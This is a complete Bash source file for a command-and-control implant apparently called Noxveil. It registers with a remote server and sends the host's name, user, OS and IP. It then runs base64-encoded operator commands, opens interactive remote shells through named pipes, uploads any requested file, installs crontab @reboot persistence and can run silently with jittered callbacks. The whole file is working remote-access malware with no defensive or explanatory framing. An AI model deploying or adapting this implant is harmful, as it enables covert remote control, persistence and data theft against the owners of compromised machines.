#!/usr/bin/env bash

set -uo pipefail

C2_URL="${C2_URL:-https://your-c2.example}"
BOOTSTRAP_TOKEN="${AGENT_AUTH_TOKEN:-replace-me-with-a-bootstrap-token}"
AUTH_TOKEN="$BOOTSTRAP_TOKEN"
CALLBACK_INTERVAL="${CALLBACK_INTERVAL:-5}"
JITTER="${JITTER:-2}"
AGENT_ID=""
CURRENT_DIR="$(pwd)"
SILENT=0
SESSION_IDLE_TIMEOUT="${SESSION_IDLE_TIMEOUT:-900}"
SESSION_ROOT=""
SESSION_OUTPUT_CHUNK=""
INTERACTIVE_SESSION_SUPPORT=0

if command -v mkfifo >/dev/null 2>&1; then
    INTERACTIVE_SESSION_SUPPORT=1
    declare -a SHELL_SESSION_IDS=()
    declare -a SHELL_SESSION_PIDS=()
    declare -a SHELL_SESSION_IN_FDS=()
    declare -a SHELL_SESSION_LAST_ACTIVITY=()
    declare -a SHELL_SESSION_IN_PATHS=()
    declare -a SHELL_SESSION_OUT_PATHS=()
    declare -a SHELL_SESSION_READ_OFFSETS=()
fi

while (($# > 0)); do
    case "$1" in
        -s|--silent)
            SILENT=1
            shift
            ;;
        --url)
            C2_URL="$2"
            shift 2
            ;;
        --token)
            BOOTSTRAP_TOKEN="$2"
            AUTH_TOKEN="$2"
            shift 2
            ;;
        --interval)
            CALLBACK_INTERVAL="$2"
            shift 2
            ;;
        --jitter)
            JITTER="$2"
            shift 2
            ;;
        *)
            shift
            ;;
    esac
done

log_info() {
    if [[ "$SILENT" -eq 0 ]]; then
        printf '[*] %s\n' "$1"
    fi
}

log_error() {
    if [[ "$SILENT" -eq 0 ]]; then
        printf '[!] %s\n' "$1" >&2
    fi
}

json_escape() {
    printf '%s' "$1" | sed ':a;N;$!ba;s/\\/\\\\/g;s/"/\\"/g;s/\r/\\r/g;s/\n/\\n/g;s/\t/\\t/g'
}

extract_json_field() {
    local payload="$1"
    local field="$2"
    printf '%s' "$payload" | sed -n "s/.*\"${field}\"[[:space:]]*:[[:space:]]*\"\([^\"]*\)\".*/\1/p" | head -n 1
}

extract_json_number() {
    local payload="$1"
    local field="$2"
    printf '%s' "$payload" | sed -n "s/.*\"${field}\"[[:space:]]*:[[:space:]]*\([0-9][0-9]*\).*/\1/p" | head -n 1
}

decode_base64() {
    if base64 -d >/dev/null 2>&1 </dev/null; then
        base64 -d
    else
        base64 -D
    fi
}

encode_base64_file() {
    if base64 -w0 "$1" >/dev/null 2>&1; then
        base64 -w0 "$1"
    else
        base64 "$1" | tr -d '\n'
    fi
}

get_internal_ip() {
    hostname -I 2>/dev/null | awk '{print $1}'
}

build_registration_payload() {
    local hostname username os_info internal_ip pid
    hostname="$(hostname 2>/dev/null || printf 'unknown')"
    username="$(whoami 2>/dev/null || printf 'unknown')"
    os_info="$(uname -a 2>/dev/null || printf 'unknown')"
    internal_ip="$(get_internal_ip)"
    pid="$$"

    printf '{"hostname":"%s","username":"%s","os_info":"%s","internal_ip":"%s","pid":%s}' \
        "$(json_escape "$hostname")" \
        "$(json_escape "$username")" \
        "$(json_escape "$os_info")" \
        "$(json_escape "${internal_ip:-unknown}")" \
        "$pid"
}

register_agent() {
    local response
    response="$(curl -fsS -X POST "${C2_URL}/api/v1/register" \
        -H "Authorization: Bearer ${BOOTSTRAP_TOKEN}" \
        -H "Content-Type: application/json" \
        --data "$(build_registration_payload)" \
        --max-time 15)" || return 1

    AGENT_ID="$(extract_json_field "$response" "agent_id")"
    AUTH_TOKEN="$(extract_json_field "$response" "agent_token")"
    local next_interval
    next_interval="$(extract_json_number "$response" "callback_interval")"

    if [[ -n "$next_interval" ]]; then
        CALLBACK_INTERVAL="$next_interval"
    fi

    if [[ -z "$AGENT_ID" || -z "$AUTH_TOKEN" ]]; then
        log_error "Registration response did not contain agent_id or agent_token"
        return 1
    fi

    log_info "Registered as ${AGENT_ID}"
    return 0
}

jitter_sleep() {
    local sleep_time
    sleep_time=$((CALLBACK_INTERVAL + RANDOM % (JITTER * 2 + 1) - JITTER))
    if [[ "$sleep_time" -lt 1 ]]; then
        sleep_time=1
    fi
    sleep "$sleep_time"
}

poll_next_task() {
    local response
    response="$(curl -fsS "${C2_URL}/api/v1/tasks/${AGENT_ID}/next" \
        -H "Authorization: Bearer ${AUTH_TOKEN}" \
        --max-time 30)" || return 1

    NEXT_TASK_ID=""
    NEXT_COMMAND=""

    while IFS='=' read -r key value; do
        case "$key" in
            interval)
                if [[ -n "$value" ]]; then
                    CALLBACK_INTERVAL="$value"
                fi
                ;;
            task_id)
                NEXT_TASK_ID="$value"
                ;;
            command_b64)
                if [[ -n "$value" ]]; then
                    NEXT_COMMAND="$(printf '%s' "$value" | decode_base64 2>/dev/null)"
                fi
                ;;
        esac
    done <<< "$response"

    return 0
}

send_result() {
    local task_id="$1"
    local output="$2"
    local is_error="${3:-false}"

    curl -fsS -X POST "${C2_URL}/api/v1/results/${task_id}/plain?is_error=${is_error}" \
        -H "Authorization: Bearer ${AUTH_TOKEN}" \
        -H "Content-Type: text/plain" \
        --data-binary "$output" \
        --max-time 20 >/dev/null 2>&1
}

heartbeat() {
    curl -fsS "${C2_URL}/api/v1/heartbeat/${AGENT_ID}" \
        -H "Authorization: Bearer ${AUTH_TOKEN}" \
        --max-time 10 >/dev/null 2>&1 || true
}

session_now() {
    date +%s
}

create_session_root() {
    local root=""
    if root="$(mktemp -d "${TMPDIR:-/tmp}/noxveil-agent.XXXXXX" 2>/dev/null)"; then
        printf '%s' "$root"
        return 0
    fi
    if root="$(mktemp -d -t noxveil-agent 2>/dev/null)"; then
        printf '%s' "$root"
        return 0
    fi

    root="${TMPDIR:-/tmp}/noxveil-agent-$$"
    mkdir -p "$root" || return 1
    printf '%s' "$root"
}

ensure_session_root() {
    if [[ "$INTERACTIVE_SESSION_SUPPORT" -ne 1 ]]; then
        return 1
    fi
    if [[ -n "$SESSION_ROOT" && -d "$SESSION_ROOT" ]]; then
        return 0
    fi

    SESSION_ROOT="$(create_session_root)" || return 1
    return 0
}

clean_session_output() {
    printf '%s' "$1" | sed '/bash: cannot set terminal process group/d;/bash: no job control in this shell/d;/warning: No TTY for interactive shell/d;/setpgid: Inappropriate ioctl for device/d'
}

session_safe_name() {
    printf '%s' "$1" | tr -c '[:alnum:]' '_'
}

session_index_for_id() {
    local target="$1"
    local i=0

    for ((i = 0; i < ${#SHELL_SESSION_IDS[@]}; i++)); do
        if [[ "${SHELL_SESSION_IDS[$i]}" == "$target" ]]; then
            printf '%s' "$i"
            return 0
        fi
    done
    return 1
}

session_touch() {
    local session_id="$1"
    local session_index=""

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || return 0
    session_index="$(session_index_for_id "$session_id")" || return 0
    SHELL_SESSION_LAST_ACTIVITY[$session_index]="$(session_now)"
}

shell_session_exists() {
    local session_id="$1"

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || return 1
    session_index_for_id "$session_id" >/dev/null 2>&1
}

shell_session_is_alive() {
    local session_id="$1"
    local session_index=""
    local pid=""

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || return 1
    session_index="$(session_index_for_id "$session_id")" || return 1
    pid="${SHELL_SESSION_PIDS[$session_index]:-}"
    [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null
}

shell_session_alive_literal() {
    local session_id="$1"
    if shell_session_is_alive "$session_id"; then
        printf 'true'
    else
        printf 'false'
    fi
}

session_remove_index() {
    local session_index="$1"

    unset "SHELL_SESSION_IDS[$session_index]"
    unset "SHELL_SESSION_PIDS[$session_index]"
    unset "SHELL_SESSION_IN_FDS[$session_index]"
    unset "SHELL_SESSION_LAST_ACTIVITY[$session_index]"
    unset "SHELL_SESSION_IN_PATHS[$session_index]"
    unset "SHELL_SESSION_OUT_PATHS[$session_index]"
    unset "SHELL_SESSION_READ_OFFSETS[$session_index]"

    SHELL_SESSION_IDS=("${SHELL_SESSION_IDS[@]}")
    SHELL_SESSION_PIDS=("${SHELL_SESSION_PIDS[@]}")
    SHELL_SESSION_IN_FDS=("${SHELL_SESSION_IN_FDS[@]}")
    SHELL_SESSION_LAST_ACTIVITY=("${SHELL_SESSION_LAST_ACTIVITY[@]}")
    SHELL_SESSION_IN_PATHS=("${SHELL_SESSION_IN_PATHS[@]}")
    SHELL_SESSION_OUT_PATHS=("${SHELL_SESSION_OUT_PATHS[@]}")
    SHELL_SESSION_READ_OFFSETS=("${SHELL_SESSION_READ_OFFSETS[@]}")
}

allocate_input_fd() {
    local candidate=30
    local i=0
    local used=0

    for ((candidate = 30; candidate <= 79; candidate++)); do
        used=0
        for ((i = 0; i < ${#SHELL_SESSION_IN_FDS[@]}; i++)); do
            if [[ "${SHELL_SESSION_IN_FDS[$i]:-}" == "$candidate" ]]; then
                used=1
                break
            fi
        done
        if [[ "$used" -eq 0 ]]; then
            printf '%s' "$candidate"
            return 0
        fi
    done

    return 1
}

close_shell_session_local() {
    local session_id="$1"
    local session_index=""
    local in_fd=""
    local pid=""
    local in_path=""
    local out_path=""
    local session_dir=""
    local pgid=""

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || return 0
    session_index="$(session_index_for_id "$session_id")" || return 0

    in_fd="${SHELL_SESSION_IN_FDS[$session_index]:-}"
    pid="${SHELL_SESSION_PIDS[$session_index]:-}"
    in_path="${SHELL_SESSION_IN_PATHS[$session_index]:-}"
    out_path="${SHELL_SESSION_OUT_PATHS[$session_index]:-}"
    session_dir="$(dirname "$in_path" 2>/dev/null || printf '')"

    if [[ -n "$pid" ]] && command -v ps >/dev/null 2>&1; then
        pgid="$(ps -o pgid= -p "$pid" 2>/dev/null | tr -d '[:space:]')"
    fi

    if [[ -n "$in_fd" ]]; then
        eval "exec ${in_fd}>&-"
    fi
    if [[ -n "$pgid" ]]; then
        kill -TERM "-${pgid}" 2>/dev/null || true
    fi
    if [[ -n "$pid" ]]; then
        kill -TERM "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
    fi

    [[ -n "$in_path" ]] && rm -f "$in_path"
    [[ -n "$out_path" ]] && rm -f "$out_path"
    if [[ -n "$session_dir" && "$session_dir" != "." && -d "$session_dir" ]]; then
        rmdir "$session_dir" 2>/dev/null || true
    fi

    session_remove_index "$session_index"
}

cleanup_shell_sessions() {
    local now="" session_id="" last_seen="" i=0

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || return 0
    now="$(session_now)"

    for ((i = ${#SHELL_SESSION_IDS[@]} - 1; i >= 0; i--)); do
        session_id="${SHELL_SESSION_IDS[$i]}"
        last_seen="${SHELL_SESSION_LAST_ACTIVITY[$i]:-0}"
        if ! shell_session_is_alive "$session_id"; then
            close_shell_session_local "$session_id"
            continue
        fi
        if (( now - last_seen > SESSION_IDLE_TIMEOUT )); then
            close_shell_session_local "$session_id"
        fi
    done
}

cleanup_all_shell_sessions() {
    local i=0

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || return 0
    for ((i = ${#SHELL_SESSION_IDS[@]} - 1; i >= 0; i--)); do
        close_shell_session_local "${SHELL_SESSION_IDS[$i]}"
    done
    if [[ -n "$SESSION_ROOT" && -d "$SESSION_ROOT" ]]; then
        rm -rf "$SESSION_ROOT"
    fi
    SESSION_ROOT=""
}

read_shell_session_output() {
    local session_id="$1"
    local session_index=""
    local out_path=""
    local offset=0
    local size=0
    SESSION_OUTPUT_CHUNK=""

    [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]] || {
        return
    }
    session_index="$(session_index_for_id "$session_id")" || {
        return
    }

    out_path="${SHELL_SESSION_OUT_PATHS[$session_index]:-}"
    offset="${SHELL_SESSION_READ_OFFSETS[$session_index]:-0}"
    [[ -n "$out_path" && -f "$out_path" ]] || {
        return
    }

    size="$(wc -c < "$out_path" 2>/dev/null | tr -d '[:space:]')"
    [[ -n "$size" ]] || size=0
    if (( size <= offset )); then
        return
    fi

    SESSION_OUTPUT_CHUNK="$(dd if="$out_path" bs=1 skip="$offset" 2>/dev/null || true)"
    SHELL_SESSION_READ_OFFSETS[$session_index]="$size"
}

send_session_payload() {
    local task_id="$1"
    local session_id="$2"
    local event="$3"
    local output="$4"
    local alive="$5"
    local is_error="${6:-false}"

    local payload
    payload="$(printf '{"session_id":"%s","event":"%s","output":"%s","alive":%s,"timestamp":%s}' \
        "$(json_escape "$session_id")" \
        "$(json_escape "$event")" \
        "$(json_escape "$output")" \
        "$alive" \
        "$(session_now)")"
    send_result "$task_id" "$payload" "$is_error"
}

send_session_error() {
    local task_id="$1"
    local session_id="$2"
    local message="$3"
    send_session_payload "$task_id" "$session_id" "error" "$message" "$(shell_session_alive_literal "$session_id")" "true"
}

handle_session_probe() {
    local task_id="$1"
    if [[ "$INTERACTIVE_SESSION_SUPPORT" -eq 1 ]]; then
        send_result "$task_id" '{"supported":true,"version":"interactive_shell_v1"}' "false"
    else
        send_result "$task_id" '{"supported":false,"reason":"mkfifo is unavailable in this shell environment"}' "false"
    fi
}

handle_session_start() {
    local task_id="$1"
    local raw_payload="$2"
    local session_id="" session_dir="" in_path="" out_path="" shell_bin="" in_fd="" pid="" safe_name=""
    local output="" alive=""

    if [[ "$INTERACTIVE_SESSION_SUPPORT" -ne 1 ]]; then
        send_result "$task_id" "Interactive shell sessions are not available in this Bash runtime" "true"
        return
    fi
    if ! ensure_session_root; then
        send_result "$task_id" "Failed to initialize interactive shell storage" "true"
        return
    fi

    session_id="$(extract_json_field "$raw_payload" "session_id")"
    if [[ -z "$session_id" ]]; then
        send_result "$task_id" "session_id is required" "true"
        return
    fi

    if shell_session_exists "$session_id"; then
        close_shell_session_local "$session_id"
    fi

    safe_name="$(session_safe_name "$session_id")"
    session_dir="${SESSION_ROOT}/${safe_name}"
    in_path="${session_dir}/input.fifo"
    out_path="${session_dir}/output.log"
    shell_bin="$(command -v bash 2>/dev/null || printf '/bin/bash')"
    mkdir -p "$session_dir" || {
        send_result "$task_id" "Failed to create interactive shell directory" "true"
        return
    }
    rm -f "$in_path" "$out_path"
    if ! mkfifo "$in_path"; then
        rm -rf "$session_dir"
        send_result "$task_id" "Failed to create interactive shell pipe" "true"
        return
    fi
    : > "$out_path"

    (
        cd "$CURRENT_DIR" || exit 1
        env TERM=xterm-256color HOME="${HOME:-$CURRENT_DIR}" PS1='noxveil$ ' "$shell_bin" --noprofile --norc -i
    ) <"$in_path" >>"$out_path" 2>&1 &
    pid=$!

    in_fd="$(allocate_input_fd)" || {
        kill -TERM "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
        rm -rf "$session_dir"
        send_result "$task_id" "No file descriptor is available for a new interactive shell session" "true"
        return
    }
    if ! eval "exec ${in_fd}>\"$in_path\""; then
        kill -TERM "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
        rm -rf "$session_dir"
        send_result "$task_id" "Failed to open the interactive shell input channel" "true"
        return
    fi

    if [[ -z "$pid" ]]; then
        eval "exec ${in_fd}>&-"
        rm -rf "$session_dir"
        send_result "$task_id" "Failed to start interactive shell session" "true"
        return
    fi

    SHELL_SESSION_IDS+=("$session_id")
    SHELL_SESSION_PIDS+=("$pid")
    SHELL_SESSION_IN_FDS+=("$in_fd")
    SHELL_SESSION_LAST_ACTIVITY+=("$(session_now)")
    SHELL_SESSION_IN_PATHS+=("$in_path")
    SHELL_SESSION_OUT_PATHS+=("$out_path")
    SHELL_SESSION_READ_OFFSETS+=("0")
    session_touch "$session_id"

    sleep 0.15
    read_shell_session_output "$session_id"
    output="$(clean_session_output "$SESSION_OUTPUT_CHUNK")"
    alive="$(shell_session_alive_literal "$session_id")"
    if [[ "$alive" != "true" ]]; then
        close_shell_session_local "$session_id"
    fi
    send_session_payload "$task_id" "$session_id" "started" "$output" "$alive" "false"
}

handle_session_input() {
    local task_id="$1"
    local raw_payload="$2"
    local session_id encoded_input raw_input in_fd output alive

    session_id="$(extract_json_field "$raw_payload" "session_id")"
    encoded_input="$(extract_json_field "$raw_payload" "data")"
    if [[ -z "$session_id" ]]; then
        send_result "$task_id" "session_id is required" "true"
        return
    fi
    if ! shell_session_exists "$session_id"; then
        send_session_error "$task_id" "$session_id" "Interactive shell session not found"
        return
    fi
    if [[ -z "$encoded_input" ]]; then
        send_session_error "$task_id" "$session_id" "data is required"
        return
    fi
    if ! raw_input="$(printf '%s' "$encoded_input" | decode_base64 2>/dev/null)"; then
        send_session_error "$task_id" "$session_id" "Invalid session input encoding"
        return
    fi

    local session_index=""
    session_index="$(session_index_for_id "$session_id")" || {
        send_session_error "$task_id" "$session_id" "Interactive shell session not found"
        return
    }
    in_fd="${SHELL_SESSION_IN_FDS[$session_index]:-}"
    if [[ -z "$in_fd" ]]; then
        send_session_error "$task_id" "$session_id" "Interactive shell input channel is unavailable"
        return
    fi

    if ! printf '%s\n' "$raw_input" >&$in_fd; then
        send_session_error "$task_id" "$session_id" "Failed to write to interactive shell session"
        close_shell_session_local "$session_id"
        return
    fi

    session_touch "$session_id"
    sleep 0.15
    read_shell_session_output "$session_id"
    output="$(clean_session_output "$SESSION_OUTPUT_CHUNK")"
    alive="$(shell_session_alive_literal "$session_id")"
    if [[ "$alive" != "true" ]]; then
        close_shell_session_local "$session_id"
    else
        session_touch "$session_id"
    fi
    send_session_payload "$task_id" "$session_id" "input" "$output" "$alive" "false"
}

handle_session_poll() {
    local task_id="$1"
    local raw_payload="$2"
    local session_id output alive

    session_id="$(extract_json_field "$raw_payload" "session_id")"
    if [[ -z "$session_id" ]]; then
        send_result "$task_id" "session_id is required" "true"
        return
    fi
    if ! shell_session_exists "$session_id"; then
        send_session_error "$task_id" "$session_id" "Interactive shell session not found"
        return
    fi

    read_shell_session_output "$session_id"
    output="$(clean_session_output "$SESSION_OUTPUT_CHUNK")"
    alive="$(shell_session_alive_literal "$session_id")"
    if [[ "$alive" != "true" ]]; then
        close_shell_session_local "$session_id"
    else
        session_touch "$session_id"
    fi
    send_session_payload "$task_id" "$session_id" "poll" "$output" "$alive" "false"
}

interrupt_shell_session() {
    local session_id="$1"
    local session_index=""
    local pid=""
    local pgid=""

    session_index="$(session_index_for_id "$session_id")" || return 1
    pid="${SHELL_SESSION_PIDS[$session_index]:-}"
    if [[ -z "$pid" ]]; then
        return 1
    fi
    if command -v ps >/dev/null 2>&1; then
        pgid="$(ps -o pgid= -p "$pid" 2>/dev/null | tr -d '[:space:]')"
    fi
    if [[ -n "$pgid" ]]; then
        kill -INT "-${pgid}" 2>/dev/null || kill -INT "$pid" 2>/dev/null || return 1
    else
        kill -INT "$pid" 2>/dev/null || return 1
    fi
    return 0
}

handle_session_signal() {
    local task_id="$1"
    local raw_payload="$2"
    local session_id signal_name output alive

    session_id="$(extract_json_field "$raw_payload" "session_id")"
    signal_name="$(extract_json_field "$raw_payload" "signal")"
    if [[ -z "$session_id" ]]; then
        send_result "$task_id" "session_id is required" "true"
        return
    fi
    if ! shell_session_exists "$session_id"; then
        send_session_error "$task_id" "$session_id" "Interactive shell session not found"
        return
    fi
    if [[ "$signal_name" != "interrupt" ]]; then
        send_session_error "$task_id" "$session_id" "Unsupported session signal"
        return
    fi
    if ! interrupt_shell_session "$session_id"; then
        send_session_error "$task_id" "$session_id" "Failed to signal interactive shell session"
        return
    fi

    sleep 0.1
    read_shell_session_output "$session_id"
    output="$(clean_session_output "$SESSION_OUTPUT_CHUNK")"
    alive="$(shell_session_alive_literal "$session_id")"
    if [[ "$alive" != "true" ]]; then
        close_shell_session_local "$session_id"
    else
        session_touch "$session_id"
    fi
    send_session_payload "$task_id" "$session_id" "signal" "$output" "$alive" "false"
}

handle_session_close() {
    local task_id="$1"
    local raw_payload="$2"
    local session_id

    session_id="$(extract_json_field "$raw_payload" "session_id")"
    if [[ -z "$session_id" ]]; then
        send_result "$task_id" "session_id is required" "true"
        return
    fi
    if ! shell_session_exists "$session_id"; then
        send_session_error "$task_id" "$session_id" "Interactive shell session not found"
        return
    fi

    close_shell_session_local "$session_id"
    send_session_payload "$task_id" "$session_id" "closed" "Shell session closed" "false" "false"
}

run_command() {
    local command="$1"
    local task_id="$2"

    case "$command" in
        "!session_probe")
            handle_session_probe "$task_id"
            return
            ;;
        "!session_start "*)
            handle_session_start "$task_id" "${command#!session_start }"
            return
            ;;
        "!session_input "*)
            handle_session_input "$task_id" "${command#!session_input }"
            return
            ;;
        "!session_poll "*)
            handle_session_poll "$task_id" "${command#!session_poll }"
            return
            ;;
        "!session_signal "*)
            handle_session_signal "$task_id" "${command#!session_signal }"
            return
            ;;
        "!session_close "*)
            handle_session_close "$task_id" "${command#!session_close }"
            return
            ;;
        "!kill")
            send_result "$task_id" "Agent terminated by operator" "false"
            cleanup_all_shell_sessions
            exit 0
            ;;
        "!info")
            send_result "$task_id" "$(build_registration_payload)" "false"
            return
            ;;
        "!sleep")
            send_result "$task_id" "Current interval: ${CALLBACK_INTERVAL}s" "false"
            return
            ;;
        "!sleep "*)
            local requested_interval
            requested_interval="$(printf '%s' "$command" | awk '{print $2}')"
            if [[ "$requested_interval" =~ ^[0-9]+$ && "$requested_interval" -ge 1 ]]; then
                CALLBACK_INTERVAL="$requested_interval"
                send_result "$task_id" "Sleep interval changed to ${CALLBACK_INTERVAL}s" "false"
            else
                send_result "$task_id" "Invalid sleep interval" "true"
            fi
            return
            ;;
        "!screenshot")
            send_result "$task_id" "Screenshot capture is not available in the Bash agent" "true"
            return
            ;;
        "!persist")
            local script_path
            script_path="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
            (crontab -l 2>/dev/null | grep -v "$script_path"; echo "@reboot bash $script_path --url ${C2_URL} --token ${BOOTSTRAP_TOKEN} --silent") | crontab -
            send_result "$task_id" "Persistence installed via crontab @reboot" "false"
            return
            ;;
        "!download "*)
            local filepath
            filepath="${command#!download }"
            if [[ -f "$filepath" ]]; then
                send_result "$task_id" "$(encode_base64_file "$filepath")" "false"
            else
                send_result "$task_id" "File not found: $filepath" "true"
            fi
            return
            ;;
        cd\ *)
            local target_dir
            target_dir="${command#cd }"
            if cd "$target_dir" 2>/dev/null; then
                CURRENT_DIR="$(pwd)"
                send_result "$task_id" "Changed directory to: ${CURRENT_DIR}" "false"
            else
                send_result "$task_id" "Failed to change directory: ${target_dir}" "true"
            fi
            return
            ;;
    esac

    local output
    local exit_code=0
    if command -v timeout >/dev/null 2>&1; then
        output="$(cd "$CURRENT_DIR" && timeout 30 bash -lc "$command" 2>&1)" || exit_code=$?
    else
        output="$(cd "$CURRENT_DIR" && bash -lc "$command" 2>&1)" || exit_code=$?
    fi

    if [[ -z "$output" ]]; then
        output="(no output)"
    fi

    if [[ "$exit_code" -eq 0 ]]; then
        send_result "$task_id" "$output" "false"
    else
        send_result "$task_id" "$output" "true"
    fi
}

main() {
    if [[ "$BOOTSTRAP_TOKEN" == "replace-me-with-a-bootstrap-token" ]]; then
        log_error "Provide a bootstrap token with --token or AGENT_AUTH_TOKEN"
        exit 1
    fi

    log_info "Bash agent starting..."
    log_info "Noxveil URL: ${C2_URL}"

    local failures=0
    until register_agent; do
        failures=$((failures + 1))
        if [[ "$failures" -ge 3 ]]; then
            log_error "Registration failed after ${failures} attempts"
            exit 1
        fi
        sleep 5
    done

    failures=0
    while true; do
        cleanup_shell_sessions
        jitter_sleep
        if poll_next_task; then
            failures=0
            cleanup_shell_sessions
            if [[ -n "${NEXT_TASK_ID:-}" && -n "${NEXT_COMMAND:-}" ]]; then
                run_command "$NEXT_COMMAND" "$NEXT_TASK_ID"
            elif (( RANDOM % 10 == 0 )); then
                heartbeat
            fi
            continue
        fi

        failures=$((failures + 1))
        log_error "Polling failed (${failures})"
        if [[ "$failures" -ge 3 ]]; then
            cleanup_all_shell_sessions
            AGENT_ID=""
            AUTH_TOKEN="$BOOTSTRAP_TOKEN"
            failures=0
            register_agent || sleep 5
        fi
    done
}

trap 'cleanup_all_shell_sessions; log_info "Received signal, shutting down..."; exit 0' INT TERM
main
